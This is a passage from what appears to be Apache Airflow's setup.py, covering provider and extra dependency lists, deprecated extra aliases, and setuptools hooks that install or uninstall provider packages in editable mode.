    Return a version to identify the state of the underlying git repo. The version will
    indicate whether the head of the current git-backed working directory is tied to a
    release tag or not : it will indicate the former with a 'release:{version}' prefix
    and the latter with a '.dev0' suffix. Following the prefix will be a sha of the current
    branch head. Finally, a ""dirty"" suffix is appended to indicate that uncommitted
    changes are present.

    :param str version_: Semver version
    :return: Found Airflow version in Git repo
    :rtype: str
    """"""
    try:
        import git

        try:
            repo = git.Repo(os.path.join(*[my_dir, '.git']))
        except git.NoSuchPathError:
            logger.warning('.git directory not found: Cannot compute the git version')
            return ''
        except git.InvalidGitRepositoryError:
            logger.warning('Invalid .git directory not found: Cannot compute the git version')
            return ''
    except ImportError:
        logger.warning('gitpython not found: Cannot compute the git version.')
        return ''
    if repo:
        sha = repo.head.commit.hexsha
        if repo.is_dirty():
            return f'.dev0+{sha}.dirty'
        # commit is clean
        return f'.release:{version_}+{sha}'
    return 'no_git_version'


def write_version(filename: str = os.path.join(*[my_dir, ""airflow"", ""git_version""])) -> None:
    """"""
    Write the Semver version + git hash to file, e.g. "".dev0+2f635dc265e78db6708f59f68e8009abb92c1e65"".

    :param str filename: Destination file to write
    """"""
    text = f""{git_version(version)}""
    with open(filename, 'w') as file:
        file.write(text)


pandas_requirement = 'pandas>=0.17.1'

# 'Start dependencies group' and 'Start dependencies group' are mark for ./scripts/ci/check_order_setup.py
# If you change this mark you should also change ./scripts/ci/check_order_setup.py
# Start dependencies group
alibaba = [
    'oss2>=2.14.0',
]
amazon = [
    'boto3>=1.15.0',
    # watchtower 3 has been released end Jan and introduced breaking change across the board that might
    # change logging behaviour:
    # https://github.com/kislyuk/watchtower/blob/develop/Changes.rst#changes-for-v300-2022-01-26
    # TODO: update to watchtower >3
    'watchtower~=2.0.1',
    'jsonpath_ng>=1.5.3',
    'redshift_connector>=2.0.888',
    'sqlalchemy_redshift>=0.8.6',
    pandas_requirement,
    'mypy-boto3-rds>=1.21.0',
    'mypy-boto3-redshift-data>=1.21.0',
]
apache_beam = [
    'apache-beam>=2.39.0',
]
arangodb = ['python-arango>=7.3.2']
asana = ['asana>=0.10']
async_packages = [
    'eventlet>=0.9.7',
    'gevent>=0.13',
    'greenlet>=0.4.9',
]
atlas = [
    'atlasclient>=0.1.2',
]
azure = [
    'azure-batch>=8.0.0',
    'azure-cosmos>=4.0.0',
    'azure-datalake-store>=0.0.45',
    'azure-identity>=1.3.1',
    'azure-keyvault-secrets>=4.1.0,<5.0',
    'azure-kusto-data>=0.0.43,<0.1',
    # Azure integration uses old librarires and the limits below reflect that
    # TODO: upgrade to newer versions of all the below libraries
    'azure-mgmt-containerinstance>=1.5.0,<2.0',
    'azure-mgmt-datafactory>=1.0.0,<2.0',
    'azure-mgmt-datalake-store>=0.5.0',
    'azure-mgmt-resource>=2.2.0',
    # limited due to https://github.com/Azure/azure-sdk-for-python/pull/18801  implementation released in 12.9
    'azure-storage-blob>=12.7.0,<12.9.0',
    'azure-storage-common>=2.1.0',
    'azure-storage-file>=2.1.0',
    # Limited due to https://github.com/Azure/azure-uamqp-python/issues/191
    'azure-servicebus>=7.6.1; platform_machine != ""aarch64""',
]
cassandra = [
    'cassandra-driver>=3.13.0',
]
celery = [
    # The Celery is known to introduce problems when upgraded to a MAJOR version. Airflow Core
    # Uses Celery for CeleryExecutor, and we also know that Kubernetes Python client follows SemVer
    # (https://docs.celeryq.dev/en/stable/contributing.html?highlight=semver#versions).
    # This is a crucial component of Airflow, so we should limit it to the next MAJOR version and only
    # deliberately bump the version when we tested it, and we know it can be bumped.
    # Bumping this version should also be connected with
    # limiting minimum airflow version supported in cncf.kubernetes provider, due to the
    # potential breaking changes in Airflow Core as well (celery is added as extra, so Airflow
    # core is not hard-limited via install-requirements, only by extra).
    'celery>=5.2.3,<6',
    'flower>=1.0.0',
]
cgroups = [
    # Cgroupspy 0.2.2 added Python 3.10 compatibility
    'cgroupspy>=0.2.2',
]
cloudant = [
    'cloudant>=2.0',
]
dask = [
    # Dask support is limited, we need Dask team to upgrade support for dask if we were to continue
    # Supporting it in the future
    'cloudpickle>=1.4.1',
    'dask>=2.9.0',
    'distributed>=2.11.1',
]
databricks = [
    'requests>=2.27,<3',
    'databricks-sql-connector>=2.0.0, <3.0.0',
    'aiohttp>=3.6.3, <4',
]
datadog = [
    'datadog>=0.14.0',
]
deprecated_api = [
    'requests>=2.26.0',
]
doc = [
    'click>=8.0',
    'sphinx>=4.4.0',
    # Docutils 0.17.0 converts generated <div class=""section""> into <section> and breaks our doc formatting
    # By adding a lot of whitespace separation. This limit can be lifted when we update our doc to handle
    # <section> tags for sections
    'docutils<0.17.0',
    # Without this, Sphinx goes in to a _very_ large backtrack on Python 3.7,
    # even though Sphinx 4.4.0 has this but with python_version<3.10.
    'importlib-metadata>=4.4; python_version < ""3.8""',
    'sphinx-airflow-theme',
    'sphinx-argparse>=0.1.13',
    'sphinx-autoapi>=1.8.0',
    'sphinx-copybutton',
    'sphinx-jinja>=2.0',
    'sphinx-rtd-theme>=0.1.6',
    'sphinxcontrib-httpdomain>=1.7.0',
    'sphinxcontrib-redoc>=1.6.0',
    'sphinxcontrib-spelling>=7.3',
]
docker = [
    'docker>=5.0.3',
]
drill = ['sqlalchemy-drill>=1.1.0', 'sqlparse>=0.4.1']
druid = [
    'pydruid>=0.4.1',
]
elasticsearch = [
    'elasticsearch>7',
    'elasticsearch-dbapi',
    'elasticsearch-dsl>=5.0.0',
]
exasol = ['pyexasol>=0.5.1', pandas_requirement]
facebook = [
    'facebook-business>=6.0.2',
]
flask_appbuilder_oauth = [
    'flask-appbuilder[oauth]',
]
github = [
    'pygithub',
]
google = [
    # Google has very clear rules on what dependencies should be used. All the limits below
    # follow strict guidelines of Google Libraries as quoted here:
    # While this issue is open, dependents of google-api-core, google-cloud-core. and google-auth
    # should preserve >1, <3 pins on these packages.
    # https://github.com/googleapis/google-cloud-python/issues/10566
    # Some of Google Packages are limited to <2.0.0 because 2.0.0 releases of the libraries
    # Introduced breaking changes across the board. Those libraries should be upgraded soon
    # TODO: Upgrade all Google libraries that are limited to <2.0.0
    'PyOpenSSL',
    'google-ads>=15.1.1',
    'google-api-core>=2.7.0,<3.0.0',
    'google-api-python-client>=1.6.0,<2.0.0',
    'google-auth>=1.0.0',
    'google-auth-httplib2>=0.0.1',
    'google-cloud-aiplatform>=1.7.1,<2.0.0',
    'google-cloud-automl>=2.1.0',
    'google-cloud-bigquery-datatransfer>=3.0.0',
    'google-cloud-bigtable>=1.0.0,<2.0.0',
    'google-cloud-build>=3.0.0',
    'google-cloud-container>=2.2.0,<3.0.0',
    'google-cloud-datacatalog>=3.0.0',
    'google-cloud-dataplex>=0.1.0',
    'google-cloud-dataproc>=3.1.0',
    'google-cloud-dataproc-metastore>=1.2.0,<2.0.0',
    'google-cloud-dlp>=0.11.0,<2.0.0',
    'google-cloud-kms>=2.0.0',
    'google-cloud-language>=1.1.1,<2.0.0',
    'google-cloud-logging>=2.1.1',
    'google-cloud-memcache>=0.2.0',
    'google-cloud-monitoring>=2.0.0',
    'google-cloud-os-login>=2.0.0',
    'google-cloud-orchestration-airflow>=1.0.0,<2.0.0',
    'google-cloud-pubsub>=2.0.0',
    'google-cloud-redis>=2.0.0',
    'google-cloud-secret-manager>=0.2.0,<2.0.0',
    'google-cloud-spanner>=1.10.0,<2.0.0',
    'google-cloud-speech>=0.36.3,<2.0.0',
    'google-cloud-storage>=1.30,<2.0.0',
    'google-cloud-tasks>=2.0.0',
    'google-cloud-texttospeech>=0.4.0,<2.0.0',
    'google-cloud-translate>=1.5.0,<2.0.0',
    'google-cloud-videointelligence>=1.7.0,<2.0.0',
    'google-cloud-vision>=0.35.2,<2.0.0',
    'google-cloud-workflows>=0.1.0,<2.0.0',
    'grpcio-gcp>=0.2.2',
    'httpx',
    'json-merge-patch>=0.2',
    'looker-sdk>=22.2.0',
    'pandas-gbq',
    pandas_requirement,
    'sqlalchemy-bigquery>=1.2.1',
]
grpc = [
    # Google has very clear rules on what dependencies should be used. All the limits below
    # follow strict guidelines of Google Libraries as quoted here:
    # While this issue is open, dependents of google-api-core, google-cloud-core. and google-auth
    # should preserve >1, <3 pins on these packages.
    # https://github.com/googleapis/google-cloud-python/issues/10566
    'google-auth>=1.0.0, <3.0.0',
    'google-auth-httplib2>=0.0.1',
    'grpcio>=1.15.0',
]
hashicorp = [
    'hvac>=0.10',
]
hdfs = [
    'snakebite-py3',
    'hdfs[avro,dataframe,kerberos]>=2.0.4',
]
hive = [
    'hmsclient>=0.1.0',
    'pyhive[hive]>=0.6.0',
    # in case of Python 3.9 sasl library needs to be installed with version higher or equal than
    # 0.3.1 because only that version supports Python 3.9. For other Python version pyhive[hive] pulls
    # the sasl library anyway (and there sasl library version is not relevant)
    'sasl>=0.3.1; python_version>=""3.9""',
    'thrift>=0.9.2',
    pandas_requirement,
]
http = [
    # The 2.26.0 release of requests got rid of the chardet LGPL mandatory dependency, allowing us to
    # release it as a requirement for airflow
    'requests>=2.26.0',
]
http_provider = [
    'apache-airflow-providers-http',
]
influxdb = [
    'influxdb-client>=1.19.0',
    pandas_requirement,
]
jdbc = [
    'jaydebeapi>=1.1.1',
]
jenkins = [
    'python-jenkins>=1.0.0',
]
jira = [
    'JIRA>1.0.7',
]
kerberos = [
    'pykerberos>=1.1.13',
    'requests_kerberos>=0.10.0',
    'thrift_sasl>=0.2.0',
]
kubernetes = [
    'cryptography>=2.0.0',
    # The Kubernetes API is known to introduce problems when upgraded to a MAJOR version. Airflow Core
    # Uses Kubernetes for Kubernetes executor, and we also know that Kubernetes Python client follows SemVer
    # (https://github.com/kubernetes-client/python#compatibility). This is a crucial component of Airflow
    # So we should limit it to the next MAJOR version and only deliberately bump the version when we
    # tested it, and we know it can be bumped. Bumping this version should also be connected with
    # limiting minimum airflow version supported in cncf.kubernetes provider, due to the
    # potential breaking changes in Airflow Core as well (kubernetes is added as extra, so Airflow
    # core is not hard-limited via install-requirements, only by extra).
    'kubernetes>=21.7.0,<24',
]
kylin = ['kylinpy>=2.6']
ldap = [
    'ldap3>=2.5.1',
    'python-ldap',
]
leveldb = ['plyvel; platform_machine != ""aarch64""']
mongo = [
    'dnspython>=1.13.0',
    # pymongo 4.0.0 removes connection option `ssl_cert_reqs` which is used in providers-mongo/2.2.0
    # TODO: Upgrade to pymongo 4.0.0+
    'pymongo>=3.6.0,<4.0.0',
]
mssql = [
    'pymssql>=2.1.5; platform_machine != ""aarch64""',
]
mysql = [
    'mysql-connector-python>=8.0.11; platform_machine != ""aarch64""',
    'mysqlclient>=1.3.6; platform_machine != ""aarch64""',
]
neo4j = ['neo4j>=4.2.1']
odbc = [
    'pyodbc',
]
opsgenie = [
    'opsgenie-sdk>=2.1.5',
]
oracle = [
    'cx_Oracle>=5.1.2',
]
pagerduty = [
    'pdpyras>=4.1.2',
]
pandas = [
    pandas_requirement,
]
papermill = [
    'papermill[all]>=1.2.1',
    'scrapbook[all]',
]
password = [
    'bcrypt>=2.0.0',
    'flask-bcrypt>=0.7.1',
]
pinot = [
    # pinotdb v0.1.1 may still work with older versions of Apache Pinot, but we've confirmed that it
    # causes a problem with newer versions.
    'pinotdb>0.1.2',
]
plexus = [
    'arrow>=0.16.0',
]
postgres = [
    'psycopg2-binary>=2.7.4',
]
presto = [
    'presto-python-client>=0.8.2',
    pandas_requirement,
]
psrp = [
    'pypsrp>=0.8',
]
qubole = [
    'qds-sdk>=1.10.4',
]
rabbitmq = [
    'amqp',
]
redis = [
    # Redis 4 introduced a number of changes that likely need testing including mixins in redis commands
    # as well as unquoting URLS with `urllib.parse.unquote`:
    # https://github.com/redis/redis-py/blob/master/CHANGES
    # TODO: upgrade to support redis package >=4
    'redis~=3.2',
]
salesforce = ['simple-salesforce>=1.0.0', 'tableauserverclient', pandas_requirement]
samba = [
    'smbprotocol>=1.5.0',
]
segment = [
    'analytics-python>=1.2.9',
]
sendgrid = [
    'sendgrid>=6.0.0',
]
sentry = [
    'blinker>=1.1',
    'sentry-sdk>=0.8.0',
]
singularity = ['spython>=0.0.56']
slack = [
    'slack_sdk>=3.0.0',
]
snowflake = [
    'snowflake-connector-python>=2.4.1',
    'snowflake-sqlalchemy>=1.1.0',
]
spark = [
    'pyspark',
]
ssh = [
    'paramiko>=2.6.0',
    'pysftp>=0.2.9',
    'sshtunnel>=0.3.2',
]
statsd = [
    'statsd>=3.3.0',
]
tableau = [
    'tableauserverclient',
]
telegram = [
    'python-telegram-bot>=13.0',
]
trino = [
    'trino>=0.301.0',
    pandas_requirement,
]
vertica = [
    'vertica-python>=0.5.1',
]
virtualenv = [
    'virtualenv',
]
webhdfs = [
    'hdfs[avro,dataframe,kerberos]>=2.0.4',
]
winrm = [
    'pywinrm>=0.4',
]
yandex = [
    'yandexcloud>=0.146.0',
]
zendesk = [
    'zenpy>=2.0.24',
]
# End dependencies group

# Mypy 0.900 and above ships only with stubs from stdlib so if we need other stubs, we need to install them
# manually as `types-*`. See https://mypy.readthedocs.io/en/stable/running_mypy.html#missing-imports
# for details. Wy want to install them explicitly because we want to eventually move to
# mypyd which does not support installing the types dynamically with --install-types
mypy_dependencies = [
    # TODO: upgrade to newer versions of MyPy continuously as they are released
    'mypy==0.910',
    'types-boto',
    'types-certifi',
    'types-croniter',
    'types-Deprecated',
    'types-docutils',
    'types-freezegun',
    'types-paramiko',
    'types-protobuf',
    'types-python-dateutil',
    'types-python-slugify',
    'types-pytz',
    'types-redis',
    'types-requests',
    'types-setuptools',
    'types-termcolor',
    'types-tabulate',
    'types-toml',
    'types-Markdown',
    'types-PyMySQL',
    'types-PyYAML',
]

# Dependencies needed for development only
devel_only = [
    'asynctest~=0.13',
    'aws_xray_sdk',
    'beautifulsoup4>=4.7.1',
    'black',
    'blinker',
    'bowler',
    'click>=8.0',
    'coverage',
    'filelock',
    'flake8>=3.6.0',
    'flake8-colors',
    'flake8-implicit-str-concat',
    'flaky',
    'freezegun',
    'gitpython',
    'ipdb',
    'jira',
    'jsondiff',
    'mongomock',
    'moto[cloudformation, glue]>=3.1.12',
    'parameterized',
    'paramiko',
    'pipdeptree',
    'pre-commit',
    'pypsrp',
    'pygithub',
    'pysftp',
    # Pytest 7 has been released in February 2022 and we should attempt to upgrade and remove the limit
    # It contains a number of potential breaking changes but none of them looks breaking our use
    # https://docs.pytest.org/en/latest/changelog.html#pytest-7-0-0-2022-02-03
    # TODO: upgrade it and remove the limit
    'pytest~=6.0',
    'pytest-asyncio',
    'pytest-cov',
    'pytest-instafail',
    # We should attempt to remove the limit when we upgrade Pytest
    # TODO: remove the limit when we upgrade pytest
    'pytest-rerunfailures~=9.1',
    'pytest-timeouts',
    'pytest-xdist',
    'python-jose',
    'pywinrm',
    'qds-sdk>=1.9.6',
    'pytest-httpx',
    'requests_mock',
    'rich-click>=1.5',
    'semver',
    'towncrier',
    'twine',
    'wheel',
    'yamllint',
]

devel = cgroups + devel_only + doc + kubernetes + mypy_dependencies + mysql + pandas + password
devel_hadoop = devel + hdfs + hive + kerberos + presto + webhdfs

# Dict of all providers which are part of the Apache Airflow repository together with their requirements
PROVIDERS_REQUIREMENTS: Dict[str, List[str]] = {
    'airbyte': http_provider,
    'alibaba': alibaba,
    'amazon': amazon,
    'apache.beam': apache_beam,
    'apache.cassandra': cassandra,
    'apache.drill': drill,
    'apache.druid': druid,
    'apache.hdfs': hdfs,
    'apache.hive': hive,
    'apache.kylin': kylin,
    'apache.livy': http_provider,
    'apache.pig': [],
    'apache.pinot': pinot,
    'apache.spark': spark,
    'apache.sqoop': [],
    'arangodb': arangodb,
    'asana': asana,
    'celery': celery,
    'cloudant': cloudant,
    'cncf.kubernetes': kubernetes,
    'databricks': databricks,
    'datadog': datadog,
    'dbt.cloud': http_provider,
    'dingding': [],
    'discord': [],
    'docker': docker,
    'elasticsearch': elasticsearch,
    'exasol': exasol,
    'facebook': facebook,
    'ftp': [],
    'github': github,
    'google': google,
    'grpc': grpc,
    'hashicorp': hashicorp,
    'http': http,
    'imap': [],
    'influxdb': influxdb,
    'jdbc': jdbc,
    'jenkins': jenkins,
    'jira': jira,
    'microsoft.azure': azure,
    'microsoft.mssql': mssql,
    'microsoft.psrp': psrp,
    'microsoft.winrm': winrm,
    'mongo': mongo,
    'mysql': mysql,
    'neo4j': neo4j,
    'odbc': odbc,
    'openfaas': [],
    'opsgenie': opsgenie,
    'oracle': oracle,
    'pagerduty': pagerduty,
    'papermill': papermill,
    'plexus': plexus,
    'postgres': postgres,
    'presto': presto,
    'qubole': qubole,
    'redis': redis,
    'salesforce': salesforce,
    'samba': samba,
    'segment': segment,
    'sendgrid': sendgrid,
    'sftp': ssh,
    'singularity': singularity,
    'slack': slack,
    'snowflake': snowflake,
    'sqlite': [],
    'ssh': ssh,
    'tableau': tableau,
    'telegram': telegram,
    'trino': trino,
    'vertica': vertica,
    'yandex': yandex,
    'zendesk': zendesk,
}

# Those are all additional extras which do not have their own 'providers'
# The 'apache.atlas' and 'apache.webhdfs' are extras that provide additional libraries
# but they do not have separate providers (yet?), they are merely there to add extra libraries
# That can be used in custom python/bash operators.
ADDITIONAL_EXTRAS_REQUIREMENTS: Dict[str, List[str]] = {
    'apache.atlas': atlas,
    'apache.webhdfs': webhdfs,
}


# Those are extras that are extensions of the 'core' Airflow. They provide additional features
# To airflow core. They do not have separate providers because they do not have any operators/hooks etc.
CORE_EXTRAS_REQUIREMENTS: Dict[str, List[str]] = {
    'async': async_packages,
    'celery': celery,  # also has provider, but it extends the core with the CeleryExecutor
    'cgroups': cgroups,
    'cncf.kubernetes': kubernetes,  # also has provider, but it extends the core with the KubernetesExecutor
    'dask': dask,
    'deprecated_api': deprecated_api,
    'github_enterprise': flask_appbuilder_oauth,
    'google_auth': flask_appbuilder_oauth,
    'kerberos': kerberos,
    'ldap': ldap,
    'leveldb': leveldb,
    'pandas': pandas,
    'password': password,
    'rabbitmq': rabbitmq,
    'sentry': sentry,
    'statsd': statsd,
    'virtualenv': virtualenv,
}

EXTRAS_REQUIREMENTS: Dict[str, List[str]] = deepcopy(CORE_EXTRAS_REQUIREMENTS)


def add_extras_for_all_providers() -> None:
    """"""
    Adds extras for all providers.
    By default all providers have the same extra name as provider id, for example
    'apache.hive' extra has 'apache.hive' provider requirement.
    """"""
    for provider_name, provider_requirement in PROVIDERS_REQUIREMENTS.items():
        EXTRAS_REQUIREMENTS[provider_name] = provider_requirement


def add_additional_extras() -> None:
    """"""Adds extras for all additional extras.""""""
    for extra_name, extra_requirement in ADDITIONAL_EXTRAS_REQUIREMENTS.items():
        EXTRAS_REQUIREMENTS[extra_name] = extra_requirement


add_extras_for_all_providers()
add_additional_extras()

#############################################################################################################
#  The whole section can be removed in Airflow 3.0 as those old aliases are deprecated in 2.* series
#############################################################################################################

# Dictionary of aliases from 1.10 - deprecated in Airflow 2.*
EXTRAS_DEPRECATED_ALIASES: Dict[str, str] = {
    'atlas': 'apache.atlas',
    'aws': 'amazon',
    'azure': 'microsoft.azure',
    'cassandra': 'apache.cassandra',
    'crypto': '',  # All crypto requirements are installation requirements of core Airflow
    'druid': 'apache.druid',
    'gcp': 'google',
    'gcp_api': 'google',
    'hdfs': 'apache.hdfs',
    'hive': 'apache.hive',
    'kubernetes': 'cncf.kubernetes',
    'mssql': 'microsoft.mssql',
    'pinot': 'apache.pinot',
    'qds': 'qubole',
    's3': 'amazon',
    'spark': 'apache.spark',
    'webhdfs': 'apache.webhdfs',
    'winrm': 'microsoft.winrm',
}

EXTRAS_DEPRECATED_ALIASES_NOT_PROVIDERS: List[str] = [
    ""crypto"",
    ""webhdfs"",
]


def add_extras_for_all_deprecated_aliases() -> None:
    """"""
    Add extras for all deprecated aliases. Requirements for those deprecated aliases are the same
    as the extras they are replaced with.
    The requirements are not copies - those are the same lists as for the new extras. This is intended.
    Thanks to that if the original extras are later extended with providers, aliases are extended as well.
    """"""
    for alias, extra in EXTRAS_DEPRECATED_ALIASES.items():
        requirements = EXTRAS_REQUIREMENTS.get(extra) if extra != '' else []
        if requirements is None:
            raise Exception(f""The extra {extra} is missing for deprecated alias {alias}"")
        EXTRAS_REQUIREMENTS[alias] = requirements


def add_all_deprecated_provider_packages() -> None:
    """"""
    For deprecated aliases that are providers, we will swap the providers requirements to instead
    be the provider itself.

    e.g. {""kubernetes"": [""kubernetes>=3.0.0, <12.0.0"", ...]} becomes
    {""kubernetes"": [""apache-airflow-provider-cncf-kubernetes""]}
    """"""
    for alias, provider in EXTRAS_DEPRECATED_ALIASES.items():
        if alias in EXTRAS_DEPRECATED_ALIASES_NOT_PROVIDERS:
            continue
        replace_extra_requirement_with_provider_packages(alias, [provider])


add_extras_for_all_deprecated_aliases()

#############################################################################################################
#  End of deprecated section
#############################################################################################################

# This is list of all providers. It's a shortcut for anyone who would like to easily get list of
# All providers. It is used by pre-commits.
ALL_PROVIDERS = list(PROVIDERS_REQUIREMENTS.keys())

ALL_DB_PROVIDERS = [
    'apache.cassandra',
    'apache.drill',
    'apache.druid',
    'apache.hdfs',
    'apache.hive',
    'apache.pinot',
    'arangodb',
    'cloudant',
    'databricks',
    'exasol',
    'influxdb',
    'microsoft.mssql',
    'mongo',
    'mysql',
    'neo4j',
    'postgres',
    'presto',
    'trino',
    'vertica',
]

# Special requirements for all database-related providers. They are de-duplicated.
all_dbs = list({req for db_provider in ALL_DB_PROVIDERS for req in PROVIDERS_REQUIREMENTS[db_provider]})

# Requirements for all ""user"" extras (no devel). They are de-duplicated. Note that we do not need
# to separately add providers requirements - they have been already added as 'providers' extras above
_all_requirements = list({req for extras_reqs in EXTRAS_REQUIREMENTS.values() for req in extras_reqs})

# All user extras here
EXTRAS_REQUIREMENTS[""all""] = _all_requirements

# All db user extras here
EXTRAS_REQUIREMENTS[""all_dbs""] = all_dbs + pandas

# This can be simplified to devel_hadoop + _all_requirements due to inclusions
# but we keep it for explicit sake. We are de-duplicating it anyway.
devel_all = list(set(_all_requirements + doc + devel + devel_hadoop))

# Those are packages excluded for ""all"" dependencies
PACKAGES_EXCLUDED_FOR_ALL = []
PACKAGES_EXCLUDED_FOR_ALL.extend(
    [
        'snakebite',
    ]
)


def is_package_excluded(package: str, exclusion_list: List[str]) -> bool:
    """"""
    Checks if package should be excluded.

    :param package: package name (beginning of it)
    :param exclusion_list: list of excluded packages
    :return: true if package should be excluded
    """"""
    return any(package.startswith(excluded_package) for excluded_package in exclusion_list)


devel_all = [
    package
    for package in devel_all
    if not is_package_excluded(package=package, exclusion_list=PACKAGES_EXCLUDED_FOR_ALL)
]

devel_ci = devel_all


# Those are extras that we have to add for development purposes
# They can be use to install some predefined set of dependencies.
EXTRAS_REQUIREMENTS[""doc""] = doc
EXTRAS_REQUIREMENTS[""devel""] = devel  # devel already includes doc
EXTRAS_REQUIREMENTS[""devel_hadoop""] = devel_hadoop  # devel_hadoop already includes devel
EXTRAS_REQUIREMENTS[""devel_all""] = devel_all
EXTRAS_REQUIREMENTS[""devel_ci""] = devel_ci


def sort_extras_requirements() -> Dict[str, List[str]]:
    """"""
    The dictionary order remains when keys() are retrieved.
    Sort both: extras and list of dependencies to make it easier to analyse problems
    external packages will be first, then if providers are added they are added at the end of the lists.
    """"""
    sorted_requirements = dict(sorted(EXTRAS_REQUIREMENTS.items()))
    for extra_list in sorted_requirements.values():
        extra_list.sort()
    return sorted_requirements


EXTRAS_REQUIREMENTS = sort_extras_requirements()

# Those providers are pre-installed always when airflow is installed.
# Those providers do not have dependency on airflow2.0 because that would lead to circular dependencies.
# This is not a problem for PIP but some tools (pipdeptree) show those as a warning.
PREINSTALLED_PROVIDERS = [
    'ftp',
    'http',
    'imap',
    'sqlite',
]


def get_provider_package_from_package_id(package_id: str) -> str:
    """"""
    Builds the name of provider package out of the package id provided/

    :param package_id: id of the package (like amazon or microsoft.azure)
    :return: full name of package in PyPI
    """"""
    package_suffix = package_id.replace(""."", ""-"")
    return f""apache-airflow-providers-{package_suffix}""


def get_excluded_providers() -> List[str]:
    """"""Returns packages excluded for the current python version.""""""
    return []


def get_all_provider_packages() -> str:
    """"""Returns all provider packages configured in setup.py""""""
    excluded_providers = get_excluded_providers()
    return "" "".join(
        get_provider_package_from_package_id(package)
        for package in PROVIDERS_REQUIREMENTS
        if package not in excluded_providers
    )


class AirflowDistribution(Distribution):
    """"""The setuptools.Distribution subclass with Airflow specific behaviour""""""

    def __init__(self, attrs=None):
        super().__init__(attrs)
        self.install_requires = None

    def parse_config_files(self, *args, **kwargs) -> None:
        """"""
        Ensure that when we have been asked to install providers from sources
        that we don't *also* try to install those providers from PyPI.
        Also we should make sure that in this case we copy provider.yaml files so that
        Providers manager can find package information.
        """"""
        super().parse_config_files(*args, **kwargs)
        if os.getenv(INSTALL_PROVIDERS_FROM_SOURCES) == 'true':
            self.install_requires = [
                req for req in self.install_requires if not req.startswith('apache-airflow-providers-')
            ]
            provider_yaml_files = glob.glob(""airflow/providers/**/provider.yaml"", recursive=True)
            for provider_yaml_file in provider_yaml_files:
                provider_relative_path = relpath(provider_yaml_file, os.path.join(my_dir, ""airflow""))
                self.package_data['airflow'].append(provider_relative_path)
        else:
            self.install_requires.extend(
                [get_provider_package_from_package_id(package_id) for package_id in PREINSTALLED_PROVIDERS]
            )


def replace_extra_requirement_with_provider_packages(extra: str, providers: List[str]) -> None:
    """"""
    Replaces extra requirement with provider package. The intention here is that when
    the provider is added as dependency of extra, there is no need to add the dependencies
    separately. This is not needed and even harmful, because in case of future versions of
    the provider, the requirements might change, so hard-coding requirements from the version
    that was available at the release time might cause dependency conflicts in the future.

    Say for example that you have salesforce provider with those deps:

    { 'salesforce': ['simple-salesforce>=1.0.0', 'tableauserverclient'] }

    Initially ['salesforce'] extra has those requirements and it works like that when you install
    it when INSTALL_PROVIDERS_FROM_SOURCES is set to `true` (during the development). However, when
    the production installation is used, The dependencies are changed:

    { 'salesforce': ['apache-airflow-providers-salesforce'] }

    And then, 'apache-airflow-providers-salesforce' package has those 'install_requires' dependencies:
            ['simple-salesforce>=1.0.0', 'tableauserverclient']

    So transitively 'salesforce' extra has all the requirements it needs and in case the provider
    changes its dependencies, they will transitively change as well.

    In the constraint mechanism we save both - provider versions and it's dependencies
    version, which means that installation using constraints is repeatable.

    For K8s and Celery which are both ""Core executors"" and ""Providers"" we have to
    add the base dependencies to core as well, in order to mitigate problems where
    newer version of provider will have less strict limits. This should be done for both
    extras and their deprecated aliases. This is not a full protection however, the way
    extras work, this will not add ""hard"" limits for Airflow and the user who does not use
    constraints.

    :param extra: Name of the extra to add providers to
    :param providers: list of provider ids
    """"""
    if extra in ['cncf.kubernetes', 'kubernetes', 'celery']:
        EXTRAS_REQUIREMENTS[extra].extend(
            [get_provider_package_from_package_id(package_name) for package_name in providers]
        )
    else:
        EXTRAS_REQUIREMENTS[extra] = [
            get_provider_package_from_package_id(package_name) for package_name in providers
        ]


def add_provider_packages_to_extra_requirements(extra: str, providers: List[str]) -> None:
    """"""
    Adds provider packages as requirements to extra. This is used to add provider packages as requirements
    to the ""bulk"" kind of extras. Those bulk extras do not have the detailed 'extra' requirements as
    initial values, so instead of replacing them (see previous function) we can extend them.

    :param extra: Name of the extra to add providers to
    :param providers: list of provider ids
    """"""
    EXTRAS_REQUIREMENTS[extra].extend(
        [get_provider_package_from_package_id(package_name) for package_name in providers]
    )


def add_all_provider_packages() -> None:
    """"""
    In case of regular installation (providers installed from packages), we should add extra dependencies to
    Airflow - to get the providers automatically installed when those extras are installed.

    For providers installed from sources we skip that step. That helps to test and install airflow with
    all packages in CI - for example when new providers are added, otherwise the installation would fail
    as the new provider is not yet in PyPI.

    """"""
    for provider in ALL_PROVIDERS:
        replace_extra_requirement_with_provider_packages(provider, [provider])
    add_provider_packages_to_extra_requirements(""all"", ALL_PROVIDERS)
    add_provider_packages_to_extra_requirements(""devel_ci"", ALL_PROVIDERS)
    add_provider_packages_to_extra_requirements(""devel_all"", ALL_PROVIDERS)
    add_provider_packages_to_extra_requirements(""all_dbs"", ALL_DB_PROVIDERS)
    add_provider_packages_to_extra_requirements(
        ""devel_hadoop"", [""apache.hdfs"", ""apache.hive"", ""presto"", ""trino""]
    )
    add_all_deprecated_provider_packages()


class Develop(develop_orig):
    """"""Forces removal of providers in editable mode.""""""

    def run(self) -> None:  # type: ignore
        self.announce('Installing in editable mode. Uninstalling provider packages!', level=log.INFO)
        # We need to run ""python3 -m pip"" because it might be that older PIP binary is in the path
        # And it results with an error when running pip directly (cannot import pip module)
        # also PIP does not have a stable API so we have to run subprocesses ¯\_(ツ)_/¯
        try:
            installed_packages = (
                subprocess.check_output([""python3"", ""-m"", ""pip"", ""freeze""]).decode().splitlines()
            )
            airflow_provider_packages = [
                package_line.split(""="")[0]
                for package_line in installed_packages
                if package_line.startswith(""apache-airflow-providers"")
            ]
            self.announce(f'Uninstalling ${airflow_provider_packages}!', level=log.INFO)
            subprocess.check_call([""python3"", ""-m"", ""pip"", ""uninstall"", ""--yes"", *airflow_provider_packages])
        except subprocess.CalledProcessError as e:
            self.announce(f'Error when uninstalling airflow provider packages: {e}!', level=log.WARN)
        super().run()


class Install(install_orig):
    """"""Forces installation of providers from sources in editable mode.""""""

    def run(self) -> None:
        self.announce('Standard installation. Providers are installed from packages', level=log.INFO)
        super().run()


def do_setup() -> None:
    """"""
    Perform the Airflow package setup.

    Most values come from setup.cfg, only the dynamically calculated ones are passed to setup
    function call. See https://setuptools.readthedocs.io/en/latest/userguide/declarative_config.html
    """"""
    setup_kwargs = {}

    def include_provider_namespace_packages_when_installing_from_sources() -> None:
        """"""
        When installing providers from sources we install all namespace packages found below airflow,
        including airflow and provider packages, otherwise defaults from setup.cfg control this.
        The kwargs in setup() call override those that are specified in setup.cfg.
        """"""
        if os.getenv(INSTALL_PROVIDERS_FROM_SOURCES) == 'true':
